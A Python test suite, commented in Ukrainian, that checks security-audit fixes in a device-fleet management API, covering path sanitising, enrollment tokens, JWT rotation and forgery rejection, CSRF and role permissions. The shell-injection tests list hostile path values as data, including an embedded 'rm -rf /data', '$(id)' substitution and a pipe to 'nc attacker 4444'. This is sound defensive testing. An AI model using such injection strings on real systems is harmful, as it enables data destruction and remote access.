"""Перевірки, додані за підсумками аудиту безпеки.

Кожен тест закриває конкретну знайдену проблему, тож іменування свідоме:
зламається — одразу видно, який саме контроль відкотили.
"""

from __future__ import annotations

import asyncio
import uuid

import pytest
import sqlalchemy as sa

from app.core.config import get_settings
from app.core.rbac import Permission, Role, permission_names, role_has_permission
from app.core.security import (
    TOKEN_TYPE_ACCESS,
    TokenError,
    create_access_token,
    csrf_tokens_match,
    decode_token,
    generate_csrf_token,
    token_fingerprint,
    token_fingerprints,
    utcnow,
)
from app.db.models import AuditLog, Device, EnrollmentToken
from app.services import file_paths
from app.services.audit import AuditAction
from tests.conftest import TEST_PASSWORD, DeviceKey

# ------------------------------------------ ін'єкція команд через шлях ----


class TestShellMetacharacters:
    """Шлях їде на пристрій і в каталогах `allow_privileged` виконується
    через `su`. Метасимволи оболонки не мають доходити туди взагалі."""

    @pytest.mark.parametrize(
        "payload",
        [
            '/storage/x"; rm -rf /data; echo "',
            "/storage/$(id)",
            "/storage/`id`",
            "/storage/a|nc attacker 4444",
            "/storage/a&&reboot",
            "/storage/a;reboot",
            "/storage/a>overwritten",
            "/storage/a<input",
            "/storage/*",
        ],
    )
    def test_path_with_shell_syntax_is_rejected(self, payload):
        with pytest.raises(file_paths.PathViolation):
            file_paths.normalize_path(payload)

    @pytest.mark.parametrize("payload", ['report";id;"', "a`id`", "x|y", "$(id)"])
    def test_name_with_shell_syntax_is_rejected(self, payload):
        with pytest.raises(file_paths.PathViolation):
            file_paths.validate_name(payload)

    def test_bidi_control_characters_are_rejected(self):
        # Керуючі символи напрямку тексту приховують справжній вигляд шляху.
        with pytest.raises(file_paths.PathViolation):
            file_paths.normalize_path("/storage/‮gnp.exe")

    def test_legitimate_paths_still_work(self):
        assert (
            file_paths.normalize_path("/storage/emulated/0/Download/звіт 2026.pdf")
            == "/storage/emulated/0/Download/звіт 2026.pdf"
        )
        assert file_paths.normalize_path("/data/local/tmp/") == "/data/local/tmp"

    def test_shell_quote_neutralises_everything(self):
        assert file_paths.shell_quote("/tmp/a b") == "'/tmp/a b'"  # noqa: S108
        assert file_paths.shell_quote("a'b") == "'a'\\''b'"
        assert file_paths.shell_quote("$(id)") == "'$(id)'"


async def test_file_operation_with_injection_is_denied_and_audited(
    client, device, admin_headers, db
):
    root = await client.post(
        f"/api/v1/devices/{device.id}/files/roots",
        headers=admin_headers,
        json={"path": "/storage/emulated/0/Download", "writable": True,
              "allow_privileged": True},
    )
    assert root.status_code == 201

    response = await client.post(
        f"/api/v1/devices/{device.id}/files/delete",
        headers=admin_headers,
        json={"path": '/storage/emulated/0/Download/x"; rm -rf /data; echo "',
              "recursive": True},
    )
    assert response.status_code == 403

    denied = (
        await db.execute(
            sa.select(AuditLog).where(AuditLog.action == AuditAction.FILE_ACCESS_DENIED)
        )
    ).scalars().all()
    assert denied, "Спроба ін'єкції має лишити слід в аудиті"


# --------------------------------------------------- enrollment-токени ----


async def test_enrollment_token_respects_max_uses(client, admin_headers):
    created = await client.post(
        "/api/v1/enrollment/tokens", headers=admin_headers, json={"max_uses": 2}
    )
    token = created.json()["token"]

    async def enroll(android_id: str):
        return await client.post(
            "/api/v1/enroll",
            json={
                "token": token,
                "public_key": DeviceKey().public_key_b64,
                "device": {"android_id": android_id, "management_mode": "unmanaged"},
            },
        )

    assert (await enroll("aaaaaaaaaaaaaaa1")).status_code == 201
    assert (await enroll("aaaaaaaaaaaaaaa2")).status_code == 201
    # Третій має впертися в ліміт.
    assert (await enroll("aaaaaaaaaaaaaaa3")).status_code == 401


async def test_concurrent_enrollment_cannot_exceed_max_uses(client, admin_headers, db):
    """Гонка: кілька одночасних реєстрацій одним токеном.

    Лічильник збільшується виразом на боці БД, тож «прочитали-додали-
    записали» більше не дає зайвих реєстрацій.
    """
    created = await client.post(
        "/api/v1/enrollment/tokens", headers=admin_headers, json={"max_uses": 1}
    )
    token = created.json()["token"]

    async def enroll(index: int):
        return await client.post(
            "/api/v1/enroll",
            json={
                "token": token,
                "public_key": DeviceKey().public_key_b64,
                "device": {
                    "android_id": f"race{index:012d}",
                    "management_mode": "unmanaged",
                },
            },
        )

    results = await asyncio.gather(*(enroll(i) for i in range(5)), return_exceptions=True)
    ok = [r for r in results if not isinstance(r, Exception) and r.status_code == 201]
    assert len(ok) == 1, f"Зареєстровано {len(ok)} пристроїв замість одного"

    row = (
        await db.execute(sa.select(EnrollmentToken).where(EnrollmentToken.max_uses == 1))
    ).scalars().first()
    await db.refresh(row)
    assert row.use_count <= row.max_uses


async def test_malformed_public_key_is_rejected(client, admin_headers):
    token = (
        await client.post("/api/v1/enrollment/tokens", headers=admin_headers, json={})
    ).json()["token"]
    response = await client.post(
        "/api/v1/enroll",
        json={
            "token": token,
            "public_key": "not-a-real-key-" + "A" * 40,
            "device": {"android_id": "bbbbbbbbbbbbbbbb", "management_mode": "unmanaged"},
        },
    )
    assert response.status_code == 422


# ----------------------------------------------------- ротація секретів ---


class TestSecretRotation:
    """Секрети мають мінятися без розриву живих сесій."""

    def test_previous_jwt_secret_is_still_accepted(self):
        settings = get_settings()
        original = settings.jwt_secret
        try:
            issued = create_access_token(subject=str(uuid.uuid4()), role="admin")

            # Ротація: старий ключ переїжджає в *_PREVIOUS, приходить новий.
            settings.jwt_secret_previous = original
            settings.jwt_secret = "novyi-sekret-dovshyi-za-trydtsyat-dva-symvoly"

            claims = decode_token(issued.token, expected_type=TOKEN_TYPE_ACCESS)
            assert claims["role"] == "admin"

            # Нові токени підписуються вже новим ключем.
            fresh = create_access_token(subject=str(uuid.uuid4()), role="admin")
            assert decode_token(fresh.token, expected_type=TOKEN_TYPE_ACCESS)

            # Прибрали попередній — старий токен більше не приймається.
            settings.jwt_secret_previous = ""
            with pytest.raises(TokenError):
                decode_token(issued.token, expected_type=TOKEN_TYPE_ACCESS)
        finally:
            settings.jwt_secret = original
            settings.jwt_secret_previous = ""

    def test_previous_hash_secret_finds_stored_tokens(self):
        settings = get_settings()
        original = settings.token_hash_secret
        try:
            old_hash = token_fingerprint("FLEET-ABCD-EFGH-JKMN-PQRS")
            settings.token_hash_secret_previous = original
            settings.token_hash_secret = "inshyi-hash-sekret-dovshyi-za-trydtsyat-dva"

            candidates = token_fingerprints("FLEET-ABCD-EFGH-JKMN-PQRS")
            assert old_hash in candidates
            assert candidates[0] != old_hash  # новий хеш іде першим
        finally:
            settings.token_hash_secret = original
            settings.token_hash_secret_previous = ""

    def test_token_epoch_revokes_everything_at_once(self):
        settings = get_settings()
        try:
            issued = create_access_token(subject=str(uuid.uuid4()), role="admin")
            assert decode_token(issued.token, expected_type=TOKEN_TYPE_ACCESS)

            settings.token_epoch = utcnow().isoformat()
            with pytest.raises(TokenError):
                decode_token(issued.token, expected_type=TOKEN_TYPE_ACCESS)
        finally:
            settings.token_epoch = ""

    def test_token_signed_by_unknown_secret_is_rejected(self):
        import jwt as pyjwt

        forged = pyjwt.encode(
            {
                "sub": str(uuid.uuid4()),
                "typ": TOKEN_TYPE_ACCESS,
                "iat": int(utcnow().timestamp()),
                "exp": int(utcnow().timestamp()) + 900,
                "iss": get_settings().jwt_issuer,
                "aud": get_settings().jwt_audience,
            },
            "sekret-zlovmysnyka-dovshyi-za-trydtsyat-dva-symvoly",
            algorithm="HS256",
        )
        with pytest.raises(TokenError):
            decode_token(forged, expected_type=TOKEN_TYPE_ACCESS)

    def test_alg_none_token_is_rejected(self):
        import jwt as pyjwt

        forged = pyjwt.encode(
            {
                "sub": str(uuid.uuid4()),
                "typ": TOKEN_TYPE_ACCESS,
                "iat": int(utcnow().timestamp()),
                "exp": int(utcnow().timestamp()) + 900,
            },
            key="",
            algorithm="none",
        )
        with pytest.raises(TokenError):
            decode_token(forged, expected_type=TOKEN_TYPE_ACCESS)

    def test_wrong_audience_is_rejected(self):
        import jwt as pyjwt

        settings = get_settings()
        forged = pyjwt.encode(
            {
                "sub": str(uuid.uuid4()),
                "typ": TOKEN_TYPE_ACCESS,
                "iat": int(utcnow().timestamp()),
                "exp": int(utcnow().timestamp()) + 900,
                "iss": settings.jwt_issuer,
                "aud": "inshyi-servis",
            },
            settings.jwt_secret,
            algorithm="HS256",
        )
        with pytest.raises(TokenError):
            decode_token(forged, expected_type=TOKEN_TYPE_ACCESS)


# ------------------------------------------------------------- CSRF ------


def test_csrf_comparison_is_strict():
    token = generate_csrf_token()
    assert csrf_tokens_match(token, token)
    assert not csrf_tokens_match(token, token + "x")
    assert not csrf_tokens_match(None, token)
    assert not csrf_tokens_match(token, None)
    assert not csrf_tokens_match("", "")
    # Занадто довгі значення відкидаємо, не порівнюючи.
    assert not csrf_tokens_match("a" * 600, "a" * 600)


# -------------------------------------------------------------- RBAC -----


class TestRbacMatrix:
    def test_new_permissions_are_scoped(self):
        assert role_has_permission(Role.ADMIN, Permission.DEVICE_CREDENTIAL_ROTATE)
        assert not role_has_permission(Role.OPERATOR, Permission.DEVICE_CREDENTIAL_ROTATE)
        assert not role_has_permission(Role.AUDITOR, Permission.DEVICE_CREDENTIAL_ROTATE)

        assert role_has_permission(Role.SUPERADMIN, Permission.SECRET_ROTATE)
        assert not role_has_permission(Role.ADMIN, Permission.SECRET_ROTATE)

    def test_roles_are_strictly_nested(self):
        """Кожна наступна роль лише додає права, ніколи не забирає."""
        auditor = set(permission_names(Role.AUDITOR))
        operator = set(permission_names(Role.OPERATOR))
        admin = set(permission_names(Role.ADMIN))
        superadmin = set(permission_names(Role.SUPERADMIN))

        assert auditor < operator < admin < superadmin

    def test_auditor_cannot_touch_devices(self):
        for permission in (
            Permission.DEVICE_WRITE,
            Permission.DEVICE_DELETE,
            Permission.DEVICE_ACTION_SAFE,
            Permission.DEVICE_ACTION_CRITICAL,
            Permission.FILE_WRITE,
            Permission.SUPPORT_SESSION,
        ):
            assert not role_has_permission(Role.AUDITOR, permission)

    def test_unknown_role_gets_nothing(self):
        assert permission_names("root") == []
        assert not role_has_permission("root", Permission.DEVICE_READ)


async def test_auditor_is_read_only_over_http(client, auth_headers, device):
    headers = await auth_headers(email="audit@example.com", role=Role.AUDITOR)

    assert (await client.get("/api/v1/devices", headers=headers)).status_code == 200
    assert (await client.get("/api/v1/audit", headers=headers)).status_code == 200

    forbidden = [
        await client.patch(
            f"/api/v1/devices/{device.id}", headers=headers, json={"name": "перейменовано"}
        ),
        await client.delete(f"/api/v1/devices/{device.id}", headers=headers),
        await client.post("/api/v1/enrollment/tokens", headers=headers, json={}),
        await client.post(
            "/api/v1/users",
            headers=headers,
            json={"email": "x@example.com", "password": "Sup3rSecretPass!2026"},
        ),
    ]
    assert all(r.status_code == 403 for r in forbidden), [r.status_code for r in forbidden]


async def test_access_denied_is_audited(client, auth_headers, db):
    headers = await auth_headers(email="denied@example.com", role=Role.AUDITOR)
    await client.post("/api/v1/enrollment/tokens", headers=headers, json={})

    rows = (
        await db.execute(
            sa.select(AuditLog).where(AuditLog.action == AuditAction.ACCESS_DENIED)
        )
    ).scalars().all()
    assert rows
    assert rows[0].result == "denied"
    assert rows[0].details["permission"] == "enrollment:manage"


# ----------------------------------------------------- токен пристрою ----


async def test_device_token_cannot_be_used_as_user_token(client, device):
    """Токени різних типів не взаємозамінні."""
    response = await client.get("/api/v1/auth/me", headers=device.headers)
    assert response.status_code == 401


async def test_user_token_cannot_be_used_as_device_token(client, admin_headers):
    response = await client.get("/api/v1/device/me", headers=admin_headers)
    assert response.status_code == 401


async def test_deleted_device_loses_access(client, device, admin_headers, db):
    assert (await client.get("/api/v1/device/me", headers=device.headers)).status_code == 200

    assert (
        await client.delete(f"/api/v1/devices/{device.id}", headers=admin_headers)
    ).status_code == 200

    assert (await client.get("/api/v1/device/me", headers=device.headers)).status_code == 401

    row = await db.get(Device, uuid.UUID(device.id))
    await db.refresh(row)
    assert row.deleted_at is not None


async def test_csrf_cookie_is_readable_from_any_panel_path(client, make_user):
    """CSRF-cookie має бути видима скрипту на будь-якому шляху панелі.

    При Path=/api/v1/auth панель на /devices не бачила власного токена, не
    додавала заголовок — і кожне оновлення сторінки закінчувалося 403 на
    /auth/refresh, тобто виходом із сесії.
    """
    await make_user()
    response = await client.post(
        "/api/v1/auth/login",
        json={"email": "admin@example.com", "password": TEST_PASSWORD},
    )
    assert response.status_code == 200, response.text

    cookies = response.headers.get_list("set-cookie")
    csrf = next(c for c in cookies if c.startswith("fleet_csrf="))
    refresh = next(c for c in cookies if c.startswith("fleet_refresh="))

    assert "Path=/;" in csrf or csrf.rstrip().rstrip(";").endswith("Path=/")
    assert "HttpOnly" not in csrf  # інакше скрипт її не прочитає

    # Refresh-токен лишається вузько обмеженим і недоступним скрипту.
    assert "Path=/api/v1/auth" in refresh
    assert "HttpOnly" in refresh


async def test_panel_can_refresh_session_after_reload(client, make_user):
    """Повний цикл панелі: вхід, потім оновлення сесії з double-submit."""
    await make_user()
    login = await client.post(
        "/api/v1/auth/login",
        json={"email": "admin@example.com", "password": TEST_PASSWORD},
    )
    assert login.status_code == 200, login.text

    csrf = client.cookies.get("fleet_csrf")
    assert csrf, "CSRF-cookie не потрапила у сховище клієнта"

    refreshed = await client.post("/api/v1/auth/refresh", headers={"X-CSRF-Token": csrf})
    assert refreshed.status_code == 200, refreshed.text
